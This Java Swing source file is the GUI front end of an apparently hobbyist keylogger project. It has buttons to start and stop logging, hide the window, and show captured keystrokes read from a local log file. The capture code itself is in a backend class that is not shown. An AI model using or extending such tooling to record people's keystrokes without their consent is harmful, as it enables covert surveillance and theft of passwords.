/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.keylogger.frontend;

import com.keylogger.backend.KeyLogger;
import java.awt.Toolkit;
import java.awt.event.WindowEvent;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JFrame;

/**
 *
 * @author Patro
 */
public class MainFrame extends javax.swing.JFrame {

    /**
     * Creates new form MainFrame
     */
    public MainFrame() {
        initComponents();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel1 = new javax.swing.JPanel();
        jScrollPane1 = new javax.swing.JScrollPane();
        txtKeyStrokes = new javax.swing.JTextArea();
        jPanel2 = new javax.swing.JPanel();
        btnShowApplication = new javax.swing.JButton();
        btnShowKeyStrokes = new javax.swing.JButton();
        btnStartLogging = new javax.swing.JButton();
        btnStopLogging = new javax.swing.JButton();
        btnHide = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jPanel1.setBackground(new java.awt.Color(255, 255, 255));

        txtKeyStrokes.setEditable(false);
        txtKeyStrokes.setBackground(new java.awt.Color(153, 153, 255));
        txtKeyStrokes.setColumns(20);
        txtKeyStrokes.setRows(5);
        txtKeyStrokes.setLineWrap(true);
        txtKeyStrokes.setWrapStyleWord(true);
        jScrollPane1.setViewportView(txtKeyStrokes);

        btnShowApplication.setText("Show");
        btnShowApplication.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnShowApplicationActionPerformed(evt);
            }
        });
        jPanel2.add(btnShowApplication);

        btnShowKeyStrokes.setText("Show KeyStrokes");
        btnShowKeyStrokes.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnShowKeyStrokesActionPerformed(evt);
            }
        });
        jPanel2.add(btnShowKeyStrokes);

        btnStartLogging.setText("Start Logging");
        btnStartLogging.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnStartLoggingActionPerformed(evt);
            }
        });
        jPanel2.add(btnStartLogging);

        btnStopLogging.setText("Stop Logging");
        btnStopLogging.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnStopLoggingActionPerformed(evt);
            }
        });
        jPanel2.add(btnStopLogging);

        btnHide.setText("Hide");
        btnHide.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnHideActionPerformed(evt);
            }
        });
        jPanel2.add(btnHide);

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane1)
                .addContainerGap())
            .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, 763, Short.MAX_VALUE)
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 280, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(52, 52, 52)
                .addComponent(jPanel2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(75, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void btnShowKeyStrokesActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnShowKeyStrokesActionPerformed
        try {
            System.out.println(new String(Files.readAllBytes(Paths.get("D:\\Temp Projects\\KeyLogger\\log.txt"))));
            txtKeyStrokes.setText(new String(Files.readAllBytes(Paths.get("D:\\Temp Projects\\KeyLogger\\log.txt"))));
        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_btnShowKeyStrokesActionPerformed

    private void btnStartLoggingActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnStartLoggingActionPerformed
        try {
            KeyLogger.main(null);
        } catch (FileNotFoundException ex) {
            Logger.getLogger(MainFrame.class.getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_btnStartLoggingActionPerformed

    private void btnStopLoggingActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnStopLoggingActionPerformed
        System.exit(0);
    }//GEN-LAST:event_btnStopLoggingActionPerformed

    private void close() {
        WindowEvent we = new WindowEvent(this, WindowEvent.WINDOW_CLOSING);
        Toolkit.getDefaultToolkit().getSystemEventQueue().postEvent(we);
    }


    private void btnHideActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnHideActionPerformed
        setDefaultCloseOperation(javax.swing.WindowConstants.HIDE_ON_CLOSE);
        close();
    }//GEN-LAST:event_btnHideActionPerformed

    private void btnShowApplicationActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnShowApplicationActionPerformed
        
    }//GEN-LAST:event_btnShowApplicationActionPerformed

    public void showFrame() {
        this.setVisible(true);
        this.setState(JFrame.NORMAL);
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Windows".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(MainFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(MainFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(MainFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(MainFrame.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new MainFrame().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton btnHide;
    private javax.swing.JButton btnShowApplication;
    private javax.swing.JButton btnShowKeyStrokes;
    private javax.swing.JButton btnStartLogging;
    private javax.swing.JButton btnStopLogging;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextArea txtKeyStrokes;
    // End of variables declaration//GEN-END:variables
}